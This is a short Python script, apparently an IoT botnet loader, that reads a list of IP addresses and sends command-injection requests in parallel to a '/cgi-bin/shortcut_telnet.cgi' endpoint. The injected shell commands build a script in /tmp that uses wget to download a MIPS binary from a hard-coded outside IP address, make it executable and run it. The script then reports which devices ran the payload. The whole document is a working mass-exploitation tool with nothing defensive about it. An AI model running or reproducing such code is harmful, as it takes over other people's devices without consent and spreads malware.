import requests
import threading
import sys

try:
    mlist = sys.argv[1]
    port = str(sys.argv[2])
except IndexError:
    print("Usage: python3 gigatex.py list")
    sys.exit(1)

def do_request(ip):
    try:
        construct_req = requests.get(f"http://{ip}:{port}/cgi-bin/shortcut_telnet.cgi?cd%20/tmp;rm%20-rf%20giga1;%20echo%20%22wget%20http://198.98.59.103/mips%22%20%3E%20mips;%20chmod%20777%20mips")
        construct_req1 = requests.get(f"http://{ip}:{port}/cgi-bin/shortcut_telnet.cgi?cd%20/tmp;%20sh%20mips;%20sh%20giga")

        if construct_req.status_code == 200:
            print(f"{ip} successfully echoed payload into /tmp")
        if "For God so loved the world" in construct_req1.text():
            print(f"successfully executed binary on device -> {ip}")
    except requests.RequestException as e:
        print(f"failed {ip}")
with open(mlist, "r") as txt:
    txtr = txt.readlines()
    for thread in txtr:
        ip = thread.strip()
        threading.Thread(target=do_request, args=(ip,)).start()
